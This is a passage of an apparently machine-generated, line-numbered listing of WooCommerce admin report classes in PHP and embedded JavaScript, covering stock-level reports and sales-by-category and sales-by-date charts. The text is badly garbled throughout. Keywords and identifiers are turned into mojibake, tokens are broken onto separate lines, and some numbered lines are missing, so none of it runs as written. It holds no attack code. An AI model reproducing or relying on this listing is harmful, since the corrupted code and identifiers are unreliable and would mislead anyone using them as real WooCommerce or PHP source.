: "<?phpƒchoƒsc_js( __( 'Guest Orders', 'woocommerce' ) ) ?>",

307 
d©a
: 
ch¬t_d©a
.
gue¡_Üd”s
,

308 
cŞÜ
: '<?ph°echØ$this->ch¬t_cŞours['
gue¡s
']; ?>',

309 
b¬s
: { 
flCŞÜ
: '<?ph°echØ$this->ch¬t_cŞours['
gue¡s
']; ?>', 
fl
: 
Œue
, 
show
:rue, 
lšeWidth
: 0, 
b¬Width
: <?
php
 
echo
 
$this
->
b¬width
; ?> * 0.5, 
®ign
: 'center' },

310 
shadowSize
: 0,

311 
’abË_toŞt
: 
Œue
,

312 
­³nd_toŞt
: "<?phpƒcho ' ' . __( 'guest orders', 'woocommerce' ); ?>",

313 
¡ack
: 
Œue
,

316 
Ïb–
: "<?phpƒchoƒsc_js( __( 'Signups', 'woocommerce' ) ) ?>",

317 
d©a
: 
ch¬t_d©a
.
signups
,

318 
cŞÜ
: '<?ph°echØ$this->ch¬t_cŞours['
signups
']; ?>',

319 
pošts
: { 
show
: 
Œue
, 
¿dius
: 5, 
lšeWidth
: 3, 
flCŞÜ
: '#fff', 
fl
:rue },

320 
lšes
: { 
show
: 
Œue
, 
lšeWidth
: 4, 
fl
: 
çl£
 },

321 
shadowSize
: 0,

322 
’abË_toŞt
: 
Œue
,

323 
­³nd_toŞt
: "<?phpƒcho ' ' . __( 'new users', 'woocommerce' ); ?>",

324 
¡ack
: 
çl£


328 iàĞ
highlight
 !=ğ'undefšed' && 
£r›s
[ highlight ] ) {

329 
highlight_£r›s
 = 
£r›s
[ 
highlight
 ];

331 
highlight_£r›s
.
cŞÜ
 = '#9c5d90';

333 iàĞ
highlight_£r›s
.
b¬s
 )

334 
highlight_£r›s
.
b¬s
.
flCŞÜ
 = '#9c5d90';

336 iàĞ
highlight_£r›s
.
lšes
 ) {

337 
highlight_£r›s
.
lšes
.
lšeWidth
 = 5;

341 
maš_ch¬t
 = 
jQu”y
.
	`¶Ù
(

342 
	`jQu”y
('.chart-placeholder.main'),

343 
£r›s
,

345 
Ëg’d
: {

346 
show
: 
çl£


348 
grid
: {

349 
cŞÜ
: '#aaa',

350 
bÜd”CŞÜ
: 'transparent',

351 
bÜd”Width
: 0,

352 
hov”abË
: 
Œue


354 
xaxes
: [ {

355 
cŞÜ
: '#aaa',

356 
pos™iÚ
: "bottom",

357 
tickCŞÜ
: 'transparent',

358 
mode
: "time",

359 
timefÜm©
: "<?php if ( $this->chart_groupby == 'day' )ƒcho '%d %b';ƒlseƒcho '%b'; ?>",

360 
mÚthNames
: <?
php
 
echo
 
	`jsÚ_’code
Ğ
	`¬¿y_v®ues
Ğ
$wp_loÿË
->
mÚth_abb»v
 ) ) ?>,

361 
tickL’gth
: 1,

362 
mšTickSize
: [1, "<?phpƒcho $this->chart_groupby; ?>"],

363 
tickSize
: [1, "<?phpƒcho $this->chart_groupby; ?>"],

364 
fÚt
: {

365 
cŞÜ
: "#aaa"

368 
yaxes
: [

370 
mš
: 0,

371 
mšTickSize
: 1,

372 
tickDecim®s
: 0,

373 
cŞÜ
: '#ecf0f1',

374 
fÚt
: { 
cŞÜ
: "#aaa" }

379 
	`jQu”y
('.ch¬t-¶aûhŞd”').
	`»size
();

382 
	`d¿wG¿ph
();

384 
	`jQu”y
('.highlight_£r›s').
	`hov”
(

385 
	`funùiÚ
() {

386 
	`d¿wG¿ph
Ğ
	`jQu”y
(
this
).
	`d©a
('series') );

388 
	`funùiÚ
() {

389 
	`d¿wG¿ph
();

393 </
süt
>

394 <?
php


395 
	}
}

	@includes/admin/reports/class-wc-report-low-in-stock.php

1 <?
php


2 iàĞ! 
defšed
( 'ABSPATH' ) )

3 
	gex™
;

5 iàĞ! 
şass_exi¡s
( 'WC_Report_Stock' ) )

6 
»quœe_Úû
( 'class-wc-report-stock.php' );

16 şas 
	cWC_R•Üt_Low_In_Stock
 
ex‹nds
 
	mWC_R•Üt_Stock
 {

21 
public
 
funùiÚ
 
	$no_™ems
() {

22 
	`_e
( 'No†ow in stock…roducts found.', 'woocommerce' );

30 
public
 
funùiÚ
 
	$g‘_™ems
Ğ
$cu¼’t_·ge
, 
$³r_·ge
 ) {

31 
glob®
 
$wpdb
;

33 
$this
->
max_™ems
 = 0;

34 
$this
->
™ems
 = 
	`¬¿y
();

37 
$¡ock
 = 
	`absšt
Ğ
	`max
Ğ
	`g‘_İtiÚ
( 'woocommerce_notify_low_stock_amount' ), 1 ) );

38 
$no¡ock
 = 
	`absšt
Ğ
	`max
Ğ
	`g‘_İtiÚ
( 'woocommerce_notify_no_stock_amount' ), 0 ) );

40 
$qu”y_äom
 = "FROM {$wpdb->posts}‡s…osts

41 
INNER
 
JOIN
 {
$wpdb
->
po¡m‘a
} 
AS
…o¡m‘¨
ON
 
po¡s
.
ID
 =…o¡m‘a.
po¡_id


42 
INNER
 
JOIN
 {
$wpdb
->
po¡m‘a
} 
AS
 
po¡m‘a2
 
ON
 
po¡s
.
ID
 =…o¡m‘a2.
po¡_id


43 
WHERE
 1=1

44 
AND
 
po¡s
.
po¡_ty³
 
	`IN
 ('product', 'product_variation')

45 
AND
 
po¡s
.
po¡_¡©us
 = 'publish'

46 
	`AND
 (

47 
po¡m‘a
.
m‘a_key
 = '_¡ock' 
AND
 
	`CAST
Õo¡m‘a.
m‘a_v®ue
 
AS
 
SIGNED
) <= '{$stock}' AND CAST(postmeta.meta_value AS SIGNED) > '{$nostock}' AND…ostmeta.meta_value != ''

49 
	`AND
 (

50 Ğ
po¡m‘a2
.
m‘a_key
 = '_mªage_¡ock' 
AND
…o¡m‘a2.
m‘a_v®ue
 = 'yes' ) 
	`OR
 ( 
po¡s
.
po¡_ty³
 = 'product_variation' )

54 
$this
->
™ems
 = 
$wpdb
->
	`g‘_»suÉs
Ğ$wpdb->
	`´•¬e
Ğ"SELECT…o¡s.ID‡ id,…o¡s.po¡_·»Á‡ ·»Á {$qu”y_äom} GROUP BY…o¡s.ID ORDER BY…o¡s.po¡_t™Ë DESC LIMIT %d, %d;", ( 
$cu¼’t_·ge
 - 1 ) * 
$³r_·ge
, $per_page ) );

55 
$this
->
max_™ems
 = 
$wpdb
->
	`g‘_v¬
( "SELECT COUNT( DISTINCT…osts.ID ) {$query_from};" );

56 
	}
}

	@includes/admin/reports/class-wc-report-most-stocked.php

1 <?
php


2 iàĞ! 
defšed
( 'ABSPATH' ) )

3 
	gex™
;

5 iàĞ! 
şass_exi¡s
( 'WC_Report_Stock' ) )

6 
»quœe_Úû
( 'class-wc-report-stock.php' );

16 şas 
	cWC_R•Üt_Mo¡_Stocked
 
ex‹nds
 
	mWC_R•Üt_Stock
 {

23 
public
 
funùiÚ
 
	$g‘_™ems
Ğ
$cu¼’t_·ge
, 
$³r_·ge
 ) {

24 
glob®
 
$wpdb
;

26 
$this
->
max_™ems
 = 0;

27 
$this
->
™ems
 = 
	`¬¿y
();

30 
$¡ock
 = 
	`absšt
Ğ
	`max
Ğ
	`g‘_İtiÚ
( 'woocommerce_notify_low_stock_amount' ), 0 ) );

32 
$qu”y_äom
 = "FROM {$wpdb->posts}‡s…osts

33 
INNER
 
JOIN
 {
$wpdb
->
po¡m‘a
} 
AS
…o¡m‘¨
ON
 
po¡s
.
ID
 =…o¡m‘a.
po¡_id


34 
INNER
 
JOIN
 {
$wpdb
->
po¡m‘a
} 
AS
 
po¡m‘a2
 
ON
 
po¡s
.
ID
 =…o¡m‘a2.
po¡_id


35 
WHERE
 1=1

36 
AND
 
po¡s
.
po¡_ty³
 
	`IN
 ('product', 'product_variation')

37 
AND
 
po¡s
.
po¡_¡©us
 = 'publish'

38 
	`AND
 (

39 
po¡m‘a
.
m‘a_key
 = '_¡ock' 
AND
 
	`CAST
Õo¡m‘a.
m‘a_v®ue
 
AS
 
SIGNED
) > '{$stock}' AND…ostmeta.meta_value != ''

41 
	`AND
 (

42 Ğ
po¡m‘a2
.
m‘a_key
 = '_mªage_¡ock' 
AND
…o¡m‘a2.
m‘a_v®ue
 = 'yes' ) 
	`OR
 ( 
po¡s
.
po¡_ty³
 = 'product_variation' )

46 
$this
->
™ems
 = 
$wpdb
->
	`g‘_»suÉs
Ğ$wpdb->
	`´•¬e
Ğ"SELECT…o¡s.ID‡ id,…o¡s.po¡_·»Á‡ ·»Á {$qu”y_äom} GROUP BY…o¡s.ID ORDER BY CASTÕo¡m‘a.m‘a_v®uAS SIGNEDèDESC LIMIT %d, %d;", ( 
$cu¼’t_·ge
 - 1 ) * 
$³r_·ge
, $per_page ) );

47 
$this
->
max_™ems
 = 
$wpdb
->
	`g‘_v¬
( "SELECT COUNT( DISTINCT…osts.ID ) {$query_from};" );

49 
	}
}

	@includes/admin/reports/class-wc-report-out-of-stock.php

1 <?
php


2 iàĞ! 
defšed
( 'ABSPATH' ) )

3 
	gex™
;

5 iàĞ! 
şass_exi¡s
( 'WC_Report_Stock' ) )

6 
»quœe_Úû
( 'class-wc-report-stock.php' );

16 şas 
	cWC_R•Üt_Out_Of_Stock
 
ex‹nds
 
	mWC_R•Üt_Stock
 {

21 
public
 
funùiÚ
 
	$no_™ems
() {

22 
	`_e
( 'No out of stock…roducts found.', 'woocommerce' );

30 
public
 
funùiÚ
 
	$g‘_™ems
Ğ
$cu¼’t_·ge
, 
$³r_·ge
 ) {

31 
glob®
 
$wpdb
;

33 
$this
->
max_™ems
 = 0;

34 
$this
->
™ems
 = 
	`¬¿y
();

37 
$¡ock
 = 
	`absšt
Ğ
	`max
Ğ
	`g‘_İtiÚ
( 'woocommerce_notify_no_stock_amount' ), 0 ) );

39 
$qu”y_äom
 = "FROM {$wpdb->posts}‡s…osts

40 
INNER
 
JOIN
 {
$wpdb
->
po¡m‘a
} 
AS
…o¡m‘¨
ON
 
po¡s
.
ID
 =…o¡m‘a.
po¡_id


41 
INNER
 
JOIN
 {
$wpdb
->
po¡m‘a
} 
AS
 
po¡m‘a2
 
ON
 
po¡s
.
ID
 =…o¡m‘a2.
po¡_id


42 
WHERE
 1=1

43 
AND
 
po¡s
.
po¡_ty³
 
	`IN
 ('product', 'product_variation')

44 
AND
 
po¡s
.
po¡_¡©us
 = 'publish'

45 
	`AND
 (

46 
po¡m‘a
.
m‘a_key
 = '_¡ock' 
AND
 
	`CAST
Õo¡m‘a.
m‘a_v®ue
 
AS
 
SIGNED
) <= '{$stock}' AND…ostmeta.meta_value != ''

48 
	`AND
 (

49 Ğ
po¡m‘a2
.
m‘a_key
 = '_mªage_¡ock' 
AND
…o¡m‘a2.
m‘a_v®ue
 = 'yes' ) 
	`OR
 ( 
po¡s
.
po¡_ty³
 = 'product_variation' )

53 
$this
->
™ems
 = 
$wpdb
->
	`g‘_»suÉs
Ğ$wpdb->
	`´•¬e
Ğ"SELECT…o¡s.ID‡ id,…o¡s.po¡_·»Á‡ ·»Á {$qu”y_äom} GROUP BY…o¡s.ID ORDER BY…o¡s.po¡_t™Ë DESC LIMIT %d, %d;", ( 
$cu¼’t_·ge
 - 1 ) * 
$³r_·ge
, $per_page ) );

54 
$this
->
max_™ems
 = 
$wpdb
->
	`g‘_v¬
( "SELECT COUNT( DISTINCT…osts.ID ) {$query_from};" );

55 
	}
}

	@includes/admin/reports/class-wc-report-sales-by-category.php

1 <?
php


10 şas 
	cWC_R•Üt_S®es_By_C©egÜy
 
ex‹nds
 
	mWC_Admš_R•Üt
 {

12 
public
 
	m$ch¬t_cŞours
 = 
¬¿y
();

13 
public
 
	m$show_ÿ‹gÜ›s
 = 
¬¿y
();

18 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

19 iàĞ
	`is£t
Ğ
$_GET
['show_ÿ‹gÜ›s'] ) && 
	`is_¬¿y
( $_GET['show_categories'] ) ) {

20 
$this
->
show_ÿ‹gÜ›s
 = 
	`¬¿y_m­
Ğ'absšt', 
$_GET
['show_categories'] );

21 } 
	`–£if
 ( 
	`is£t
Ğ
$_GET
['show_categories'] ) ) {

22 
$this
->
show_ÿ‹gÜ›s
 = 
	`¬¿y
Ğ
	`absšt
Ğ
$_GET
['show_categories'] ) );

31 
public
 
funùiÚ
 
	$g‘_´oduùs_š_ÿ‹gÜy
Ğ
$ÿ‹gÜy_id
 ) {

32 
$‹rm_ids
 = 
	`g‘_‹rm_chd»n
Ğ
$ÿ‹gÜy_id
, 'product_cat' );

33 
$‹rm_ids
[] = 
$ÿ‹gÜy_id
;

34 
$´oduù_ids
 = 
	`g‘_objeùs_š_‹rm
Ğ
$‹rm_ids
, 'product_cat' );

36  
	`¬¿y_unique
Ğ
	`­¶y_f‹rs
Ğ'woocomm”û_»pÜt_§Ës_by_ÿ‹gÜy_g‘_´oduùs_š_ÿ‹gÜy', 
$´oduù_ids
, 
$ÿ‹gÜy_id
 ) );

37 
	}
}

43 
public
 
funùiÚ
 
	$g‘_ch¬t_Ëg’d
() {

44 iàĞ! 
$this
->
show_ÿ‹gÜ›s
 ) {

45  
	`¬¿y
();

48 
$Ëg’d
 = 
	`¬¿y
();

49 
$šdex
 = 0;

51 
	`fÜ—ch
 ( 
$this
->
show_ÿ‹gÜ›s
 
as
 
$ÿ‹gÜy
 ) {

52 
$ÿ‹gÜy
 = 
	`g‘_‹rm
( $category, 'product_cat' );

53 
$tÙ®
 = 0;

54 
$´oduù_ids
 = 
$this
->
	`g‘_´oduùs_š_ÿ‹gÜy
Ğ
$ÿ‹gÜy
->
‹rm_id
 );

56 
	`fÜ—ch
 ( 
$´oduù_ids
 
as
 
$id
 ) {

57 iàĞ
	`is£t
Ğ
$this
->
™em_§Ës
[ 
$id
 ] ) ) {

58 
$tÙ®
 +ğ
$this
->
™em_§Ës
[ 
$id
 ];

62 
$Ëg’d
[] = 
	`¬¿y
(

63 't™Ë' => 
	`¥rštf
Ğ
	`__
Ğ'% §Ë š %s', 'woocomm”û' ), '<¡rÚg>' . 
	`wc_´iû
Ğ
$tÙ®
 ) . '</¡rÚg>', 
$ÿ‹gÜy
->
Çme
 ),

64 'cŞÜ' => 
	`is£t
Ğ
$this
->
ch¬t_cŞours
[ 
$šdex
 ] ) ? $this->chart_colours[ $index ] : $this->chart_colours[ 0 ],

65 'highlight_£r›s' => 
$šdex


68 
$šdex
++;

71  
$Ëg’d
;

72 
	}
}

77 
public
 
funùiÚ
 
	$ouut_»pÜt
() {

78 
glob®
 
$woocomm”û
, 
$wpdb
, 
$wp_loÿË
;

80 
$¿nges
 = 
	`¬¿y
(

81 'y—r' => 
	`__
( 'Year', 'woocommerce' ),

82 'Ï¡_mÚth' => 
	`__
( 'Last Month', 'woocommerce' ),

83 'mÚth' => 
	`__
( 'This Month', 'woocommerce' ),

84 '7day' => 
	`__
( 'Last 7 Days', 'woocommerce' )

87 
$this
->
ch¬t_cŞours
 = 
	`¬¿y
( '#3498db', '#34495e', '#1abc9c', '#2ecc71', '#f1c40f', '#e67e22', '#e74c3c', '#2980b9', '#8e44ad', '#2c3e50', '#16a085', '#27ae60', '#f39c12', '#d35400', '#c0392b' );

89 
$cu¼’t_¿nge
 = ! 
	`em±y
Ğ
$_GET
['range'] ) ? $_GET['range'] : '7day';

91 iàĞ! 
	`š_¬¿y
Ğ
$cu¼’t_¿nge
, 
	`¬¿y
( 'custom', 'year', 'last_month', 'month', '7day' ) ) ) {

92 
$cu¼’t_¿nge
 = '7day';

95 
$this
->
	`ÿlcuÏ‹_cu¼’t_¿nge
Ğ
$cu¼’t_¿nge
 );

98 iàĞ
$this
->
show_ÿ‹gÜ›s
 ) {

99 
$Üd”_™ems
 = 
$this
->
	`g‘_Üd”_»pÜt_d©a
Ğ
	`¬¿y
(

100 'd©a' => 
	`¬¿y
(

101 '_´oduù_id' => 
	`¬¿y
(

107 '_lše_tÙ®' => 
	`¬¿y
(

113 'po¡_d©e' => 
	`¬¿y
(

121 'f‹r_¿nge' => 
Œue


124 
$this
->
™em_§Ës
 = 
	`¬¿y
();

125 
$this
->
™em_§Ës_ªd_times
 = 
	`¬¿y
();

127 iàĞ
$Üd”_™ems
 ) {

128 
	`fÜ—ch
 ( 
$Üd”_™ems
 
as
 
$Üd”_™em
 ) {

129  
$this
->
ch¬t_groupby
 ) {

131 
$time
 = 
	`¡¹Ùime
Ğ
	`d©e
Ğ'Ymd', sŒtÙimeĞ
$Üd”_™em
->
po¡_d©e
 ) ) ) * 1000;

134 
$time
 = 
	`¡¹Ùime
Ğ
	`d©e
Ğ'Ym', sŒtÙimeĞ
$Üd”_™em
->
po¡_d©e
 ) ) . '01' ) * 1000;

138 
$this
->
™em_§Ës_ªd_times
[ 
$time
 ][ 
$Üd”_™em
->
´oduù_id
 ] = 
	`is£t
Ğ$this->™em_§Ës_ªd_times[ $tim][ $Üd”_™em->´oduù_id ] ) ? $this->™em_§Ës_ªd_times[ $tim][ $Üd”_™em->´oduù_id ] + $Üd”_™em->
Üd”_™em_amouÁ
 : $order_item->order_item_amount;

140 
$this
->
™em_§Ës
[ 
$Üd”_™em
->
´oduù_id
 ] = 
	`is£t
Ğ$this->™em_§Ës[ $Üd”_™em->´oduù_id ] ) ? $this->™em_§Ës[ $Üd”_™em->´oduù_id ] + $Üd”_™em->
Üd”_™em_amouÁ
 : $order_item->order_item_amount;

145 
	`šşude
Ğ
	`WC
()->
	`¶ugš_·th
() . '/includes/admin/views/html-report-by-date.php' );

146 
	}
}

152 
public
 
funùiÚ
 
	$g‘_ch¬t_widg‘s
() {

153  
	`¬¿y
(

154 
	`¬¿y
(

155 't™Ë' => 
	`__
( 'Categories', 'woocommerce' ),

156 'ÿÎback' => 
	`¬¿y
Ğ
$this
, 'category_widget' )

159 
	}
}

165 
public
 
funùiÚ
 
	$ÿ‹gÜy_widg‘
() {

166 
$ÿ‹gÜ›s
 = 
	`g‘_‹rms
Ğ'´oduù_ÿt', 
	`¬¿y
( 'orderby' => 'name' ) );

168 <
fÜm
 
m‘hod
="GET">

169 <
div
>

170 <
£Ëù
 
muÉË
="muÉË" 
d©a
-
¶aûhŞd”
="<?ph°_eĞ'S–eù c©egÜ›s&h–l;', 'woocomm”û' ); ?>" 
şass
="cho£n_£Ëù" 
id
="show_ÿ‹gÜ›s" 
Çme
="show_ÿ‹gÜ›s[]" 
¡yË
="width: 205px;">

171 <?
php


172 
$r
 = 
	`¬¿y
();

173 
$r
['pad_counts'] = 1;

174 
$r
['hierarchical'] = 1;

175 
$r
['hide_empty'] = 1;

176 
$r
['value'] = 'id';

177 
$r
['£Ëùed'] = 
$this
->
show_ÿ‹gÜ›s
;

179 
	`šşude_Úû
Ğ
	`WC
()->
	`¶ugš_·th
() . '/includes/walkers/class-product-cat-dropdown-walker.php' );

181 
echo
 
	`wc_w®k_ÿ‹gÜy_drİdown_Œ“
Ğ
$ÿ‹gÜ›s
, 0, 
$r
 );

183 </
£Ëù
>

184 <
a
 
h»f
="#" 
şass
="£Ëù_nÚe"><?
php
 
	`_e
( 'None', 'woocommerce' ); ?></a>

185 <
a
 
h»f
="#" 
şass
="£Ëù_®l"><?
php
 
	`_e
( 'All', 'woocommerce' ); ?></a>

186 <
šput
 
ty³
="subm™" 
şass
="subm™ bu‰Ú" 
v®ue
="<?php _e( 'Show', 'woocommerce' ); ?>" />

187 <
šput
 
ty³
="hidd’" 
Çme
="¿nge" 
v®ue
="<?php if ( !ƒmpty( $_GET['range'] ) )ƒchoƒsc_attr( $_GET['range'] ) ?>" />

188 <
šput
 
ty³
="hidd’" 
Çme
="¡¬t_d©e" 
v®ue
="<?php if ( !ƒmpty( $_GET['start_date'] ) )ƒchoƒsc_attr( $_GET['start_date'] ) ?>" />

189 <
šput
 
ty³
="hidd’" 
Çme
="’d_d©e" 
v®ue
="<?php if ( !ƒmpty( $_GET['end_date'] ) )ƒchoƒsc_attr( $_GET['end_date'] ) ?>" />

190 <
šput
 
ty³
="hidd’" 
Çme
="·ge" 
v®ue
="<?php if ( !ƒmpty( $_GET['page'] ) )ƒchoƒsc_attr( $_GET['page'] ) ?>" />

191 <
šput
 
ty³
="hidd’" 
Çme
="b" 
v®ue
="<?php if ( !ƒmpty( $_GET['tab'] ) )ƒchoƒsc_attr( $_GET['tab'] ) ?>" />

192 <
šput
 
ty³
="hidd’" 
Çme
="»pÜt" 
v®ue
="<?php if ( !ƒmpty( $_GET['report'] ) )ƒchoƒsc_attr( $_GET['report'] ) ?>" />

193 </
div
>

194 <
süt
 
ty³
="text/javascript">

195 
	`jQu”y
(
	`funùiÚ
(){

196 
	`jQu”y
("£Ëù.cho£n_£Ëù").
	`cho£n
();

199 
	`jQu”y
Ğ'.ch¬t-widg‘' ).
	`Ú
Ğ'şick', '.£Ëù_®l', 
	`funùiÚ
() {

200 
	`jQu”y
(
this
).
	`şo£¡
Ğ'div' ).
	`fšd
Ğ'£Ëù o±iÚ' ).
	`©Œ
( "selected", "selected" );

201 
	`jQu”y
(
this
).
	`şo£¡
Ğ'div' ).
	`fšd
('£Ëù').
	`Œigg”
( 'chosen:updated' );

202  
çl£
;

205 
	`jQu”y
Ğ'.ch¬t-widg‘').
	`Ú
Ğ'şick', '.£Ëù_nÚe', 
	`funùiÚ
() {

206 
	`jQu”y
(
this
).
	`şo£¡
Ğ'div' ).
	`fšd
Ğ'£Ëù o±iÚ' ).
	`»moveA‰r
( "selected" );

207 
	`jQu”y
(
this
).
	`şo£¡
Ğ'div' ).
	`fšd
('£Ëù').
	`Œigg”
( 'chosen:updated' );

208  
çl£
;

211 </
süt
>

212 </
fÜm
>

213 <?
php


214 
	}
}

219 
public
 
funùiÚ
 
	$g‘_expÜt_bu‰Ú
() {

220 
$cu¼’t_¿nge
 = ! 
	`em±y
Ğ
$_GET
['range'] ) ? $_GET['range'] : '7day';

222 <
a


223 
h»f
="#"

224 
dowÆßd
="report-<?phpƒcho $current_range; ?>-<?phpƒcho date_i18n( 'Y-m-d', current_time('timestamp') ); ?>.csv"

225 
şass
="export_csv"

226 
d©a
-
expÜt
="chart"

227 
d©a
-
xaxes
="<?php _e( 'Date', 'woocommerce' ); ?>"

228 
d©a
-
groupby
="<?phpƒcho $this->chart_groupby; ?>"

230 <?
php
 
	`_e
( 'Export CSV', 'woocommerce' ); ?>

231 </
a
>

232 <?
php


233 
	}
}

239 
public
 
funùiÚ
 
	$g‘_maš_ch¬t
() {

240 
glob®
 
$wp_loÿË
;

242 iàĞ! 
$this
->
show_ÿ‹gÜ›s
 ) {

244 <
div
 
şass
="chart-container">

245 <
p
 
şass
="ch¬t-´om±"><?
php
 
	`_e
( '&larr; Choose‡ categoryo view stats', 'woocommerce' ); ?></p>

246 </
div
>

247 <?
php


249 
$šşude_ÿ‹gÜ›s
 = 
	`¬¿y
();

250 
$ch¬t_d©a
 = 
	`¬¿y
();

251 
$ch¬t_ticks
 = 
	`¬¿y
();

252 
$šdex
 = 0;

254 
	`fÜ—ch
 ( 
$this
->
show_ÿ‹gÜ›s
 
as
 
$ÿ‹gÜy
 ) {

255 
$ÿ‹gÜy
 = 
	`g‘_‹rm
( $category, 'product_cat' );

256 
$´oduù_ids
 = 
$this
->
	`g‘_´oduùs_š_ÿ‹gÜy
Ğ
$ÿ‹gÜy
->
‹rm_id
 );

257 
$ÿ‹gÜy_tÙ®
 = 0;

258 
$ÿ‹gÜy_ch¬t_d©a
 = 
	`¬¿y
();

260  
$i
 = 0; $˜<ğ
$this
->
ch¬t_š‹rv®
; $i ++ ) {

261 
$š‹rv®_tÙ®
 = 0;

263  
$this
->
ch¬t_groupby
 ) {

265 
$time
 = 
	`¡¹Ùime
Ğ
	`d©e
Ğ'Ymd', sŒtÙimeĞ"+{$i} DAY", 
$this
->
¡¬t_d©e
 ) ) ) * 1000;

268 
$time
 = 
	`¡¹Ùime
Ğ
	`d©e
Ğ'Ym', sŒtÙimeĞ"+{$i} MONTH", 
$this
->
¡¬t_d©e
 ) ) . '01' ) * 1000;

272 
	`fÜ—ch
 ( 
$´oduù_ids
 
as
 
$id
 ) {

273 iàĞ
	`is£t
Ğ
$this
->
™em_§Ës_ªd_times
[ 
$time
 ][ 
$id
 ] ) ) {

274 
$š‹rv®_tÙ®
 +ğ
$this
->
™em_§Ës_ªd_times
[ 
$time
 ][ 
$id
 ];

275 
$ÿ‹gÜy_tÙ®
 +ğ
$this
->
™em_§Ës_ªd_times
[ 
$time
 ][ 
$id
 ];

279 
$ÿ‹gÜy_ch¬t_d©a
[] = 
	`¬¿y
Ğ
$time
, 
$š‹rv®_tÙ®
 );

285 
$ch¬t_d©a
[ 
$ÿ‹gÜy
->
‹rm_id
 ]['ÿ‹gÜy'] = $ÿ‹gÜy->
Çme
;

286 
$ch¬t_d©a
[ 
$ÿ‹gÜy
->
‹rm_id
 ]['d©a'] = 
$ÿ‹gÜy_ch¬t_d©a
;

288 
$šdex
 ++;

291 <
div
 
şass
="chart-container">

292 <
div
 
şass
="chart-placeholder main"></div>

293 </
div
>

294 <
süt
 
ty³
="text/javascript">

295 
v¬
 
maš_ch¬t
;

297 
	`jQu”y
(
	`funùiÚ
(){

298 
v¬
 
d¿wG¿ph
 = 
	`funùiÚ
Ğ
highlight
 ) {

299 
v¬
 
£r›s
 = [

300 <?
php


301 
$šdex
 = 0;

302 
	`fÜ—ch
 ( 
$ch¬t_d©a
 
as
 
$d©a
 ) {

303 
$cŞÜ
 = 
	`is£t
Ğ
$this
->
ch¬t_cŞours
[ 
$šdex
 ] ) ? $this->chart_colours[ $index ] : $this->chart_colours[0];

304 
$width
 = 
$this
->
b¬width
 / Ğ
$ch¬t_d©a
 );

305 
$off£t
 = ( 
$width
 * 
$šdex
 );

306 
$£r›s
 = 
$d©a
['data'];

307 
	`fÜ—ch
 ( 
$£r›s
 
as
 
$key
 => 
$£r›s_d©a
 )

308 
$£r›s
[ 
$key
 ][0] = 
$£r›s_d©a
[0] + 
$off£t
;

309 
echo
 '{

310 
Ïb–
: "' .ƒsc_js( $data['category'] ) . '",

311 
d©a
: 
jQu”y
.
	`·r£JSON
( "' . json_encode( $series ) . '" ),

312 
cŞÜ
: "' . $color . '",

313 
b¬s
: { 
flCŞÜ
: "' . $cŞÜ . '", 
fl
: 
Œue
, 
show
:rue, 
lšeWidth
: 1, 
®ign
: "ûÁ”", 
b¬Width
: ' . $width * 0.75 . ', 
¡ack
: 
çl£
 },

314 
´•’d_toŞt
: "' . get_woocommerce_currency_symbol() . '",

315 
’abË_toŞt
: 
Œue
,

316 
´•’d_Ïb–
: 
Œue


318 
$šdex
++;

323 iàĞ
highlight
 !=ğ'undefšed' && 
£r›s
[ highlight ] ) {

324 
highlight_£r›s
 = 
£r›s
[ 
highlight
 ];

326 
highlight_£r›s
.
cŞÜ
 = '#9c5d90';

328 iàĞ
highlight_£r›s
.
b¬s
 )

329 
highlight_£r›s
.
b¬s
.
flCŞÜ
 = '#9c5d90';

331 iàĞ
highlight_£r›s
.
lšes
 ) {

332 
highlight_£r›s
.
lšes
.
lšeWidth
 = 5;

336 
maš_ch¬t
 = 
jQu”y
.
	`¶Ù
(

337 
	`jQu”y
('.chart-placeholder.main'),

338 
£r›s
,

340 
Ëg’d
: {

341 
show
: 
çl£


343 
grid
: {

344 
cŞÜ
: '#aaa',

345 
bÜd”CŞÜ
: 'transparent',

346 
bÜd”Width
: 0,

347 
hov”abË
: 
Œue


349 
xaxes
: [ {

350 
cŞÜ
: '#aaa',

351 
»£rveS·û
: 
Œue
,

352 
pos™iÚ
: "bottom",

353 
tickCŞÜ
: 'transparent',

354 
mode
: "time",

355 
timefÜm©
: "<?php if ( $this->chart_groupby == 'day' )ƒcho '%d %b';ƒlseƒcho '%b'; ?>",

356 
mÚthNames
: <?
php
 
echo
 
	`jsÚ_’code
Ğ
	`¬¿y_v®ues
Ğ
$wp_loÿË
->
mÚth_abb»v
 ) ); ?>,

357 
tickL’gth
: 1,

358 
mšTickSize
: [1, "<?phpƒcho $this->chart_groupby; ?>"],

359 
tickSize
: [1, "<?phpƒcho $this->chart_groupby; ?>"],

360 
fÚt
: {

361 
cŞÜ
: "#aaa"

364 
yaxes
: [

366 
mš
: 0,

367 
tickDecim®s
: 2,

368 
cŞÜ
: 'transparent',

369 
fÚt
: { 
cŞÜ
: "#aaa" }

375 
	`jQu”y
('.ch¬t-¶aûhŞd”').
	`»size
();

379 
	`d¿wG¿ph
();

381 
	`jQu”y
('.highlight_£r›s').
	`hov”
(

382 
	`funùiÚ
() {

383 
	`d¿wG¿ph
Ğ
	`jQu”y
(
this
).
	`d©a
('series') );

385 
	`funùiÚ
() {

386 
	`d¿wG¿ph
();

390 </
süt
>

391 <?
php


392 
	}
}

	@includes/admin/reports/class-wc-report-sales-by-date.php

1 <?
php


10 şas 
	cWC_R•Üt_S®es_By_D©e
 
ex‹nds
 
	mWC_Admš_R•Üt
 {

12 
public
 
	m$ch¬t_cŞours
 = 
¬¿y
();

18 
public
 
funùiÚ
 
	$g‘_ch¬t_Ëg’d
() {

19 
$Ëg’d
 = 
	`¬¿y
();

21 
$Üd”_tÙ®s
 = 
$this
->
	`g‘_Üd”_»pÜt_d©a
Ğ
	`¬¿y
(

22 'd©a' => 
	`¬¿y
(

23 '_Üd”_tÙ®' => 
	`¬¿y
(

28 '_Üd”_shpšg' => 
	`¬¿y
(

33 'ID' => 
	`¬¿y
(

39 'f‹r_¿nge' => 
Œue


41 
$tÙ®_§Ës
 = 
$Üd”_tÙ®s
->
tÙ®_§Ës
;

42 
$tÙ®_shpšg
 = 
$Üd”_tÙ®s
->
tÙ®_shpšg
;

43 
$tÙ®_Üd”s
 = 
	`absšt
Ğ
$Üd”_tÙ®s
->
tÙ®_Üd”s
 );

44 
$tÙ®_™ems
 = 
	`absšt
Ğ
$this
->
	`g‘_Üd”_»pÜt_d©a
Ğ
	`¬¿y
(

45 'd©a' => 
	`¬¿y
(

46 '_qty' => 
	`¬¿y
(

54 'f‹r_¿nge' => 
Œue


57 
$tÙ®_coupÚs
